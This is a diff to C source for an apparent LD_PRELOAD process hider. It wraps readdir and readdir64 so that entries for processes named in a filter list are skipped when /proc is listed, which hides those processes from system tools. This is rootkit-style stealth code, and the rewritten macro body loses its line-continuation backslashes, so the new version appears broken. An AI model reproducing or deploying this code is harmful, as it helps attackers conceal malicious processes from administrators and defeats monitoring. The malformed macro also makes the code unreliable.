@@ -78,28 +78,27 @@ struct dirent* readdir(DIR *dirp)                                       \
     char process_name[256];                                             \
     int i;                                                              \
                                                                         \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-                strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name)) {          \
-                int exclude_process = 0;                                \
-                for (i = 0; i < sizeof(process_to_filter) / sizeof(process_to_filter[0]); i++) { \
-                    if (strcmp(process_name, process_to_filter[i]) == 0) { \
-                        exclude_process = 1;                            \
-                        break;                                          \
-                    }                                                   \
-                }                                                       \
-                if (exclude_process) {                                  \
-                    continue;                                           \
-                }                                                       \
-            }                                                           \
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
+    while (1) { 
+       dir = original_##readdir(dirp); 
+        if (!dir) break; 
+    
+        if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
+           
+            if (strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {
+                int exclude_process = 0;
+                for (i = 0; i < (int)(sizeof(process_to_filter) / sizeof(process_to_filter[0])); i++) {
+                    if (strcmp(process_name, process_to_filter[i]) == 0) {
+                        exclude_process = 1;
+                        break;
+                    }
+                }
+                if (exclude_process) continue; 
+            }
+        }
+        break; 
+    }
+return dir;
+                                                        \
 }
 
 DECLARE_READDIR(dirent64, readdir64);
